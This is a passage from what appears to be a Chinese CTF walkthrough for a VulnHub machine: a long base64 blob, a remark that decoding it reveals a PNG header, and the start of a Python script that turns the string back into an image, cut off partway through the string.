xckEVW6UnGTv3r1f/OIXx/3R5s2bte6+oihuc9FFFyXu8vvYY49t2rRpop++733vS3z9Bx98cJKS
KarcKLnLv/zLv9xwww2j/udDDz10zjnn+CKPoihTiptuuinxB37+858n+OmWLVsSG29WrVqlxptJ
o8qNksPcc889JSUln/zkJ7///e9/8pOfPOWUUy677DK/hVIUZUpw8sknJ/7AkSNHEn/grbfeyvAW
ykRo+wUltxkZGUl8PFIURVGmGmq5URRFURQlr1DlRlEURVGUvEKVG0VRFEVR8gpVbhRFURRFySum
kHLT19eX+AOVlZXeSKJMWZLOMZ2EFknHobe3120ZkjYJ8UCGsWS+jmXD2CqK20wh5Wbbtm2JP6Ct
5xW3STzHamtrZ82a5ZkwWUvScejr69u/f7+rMixdujSxcuOBDOOS4TqWDWOrKB4whZSbO+64I/EH
br31Vm8kUaYsiefYF77wBc8kyWaSjsO//du/uS3DnXfe6bsM45LhOpYNY6soHjCFlJu//vWvDz30
UIIPrF279tprr/VMHmUKkmCOnXvuuTfeeKPH8mQhScdh9+7dX/3qV12V4dprr924caO/MkxEJutY
NoytonjDFFJugMsuu+yee+5J8IF777335ptv9kweZQoy7hy79NJLX3jhBV/kySqSjsOmTZtOP/10
V2X42te+du+99/orQ2Imt45lw9gqimdMuQrFN9xww/e+972PfvSjCxYsWLRo0fr160d94K677rrh
hht+/etf79u3r76+/tlnn/VFTiWPMedYeXn5xz/+8akc77V69eqlS5fOmDFjonHYsWPH/v37e3p6
fvrTn27ZssUNGZYtW7Zq1aply5Zdc801tbW1Yz+wf//+HTt2uCpDWqS1jiWYYx6MraIoPjBnzpwn
nngiNjGdnZ2XXHKJ32I6SYIva5E0SeTQoUOJr7Bq1Sq3Zcicm2++ObEMP/nJT9K9ZtLvlTkejG3m
zzdFVq1a9dZbbyW40b59+0477TRH7jURVVVVW7duTSBDKBS64IILJnfxpM9i5cqVjnyLpOvY/9/e
/cdUVf8PHL/7hMQcsTtTBAIlfolsyJShIt1MGZopc6ZzNd1qyx9h0820NStqc42mpjN/Ui1Ls2W5
1GERaohC+QMNDCo0EBTIS0JBg8WdUHz/oC8acN/ncO6973PvOc/Hn9z3fZ/XeZ9z3vfFOe/zfuvS
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
AAAAAACg0f8BeD+YFbp5dlYAAAAASUVORK5CYII=
```

成功读取该文件，将内容复制后，尝试base64解密，，发现是png的文件头如下图：

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub47.jpg)

使用python脚本将该base64字符串转换为png图片，脚本如下：

``` bash
import os,base64 
strs='''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
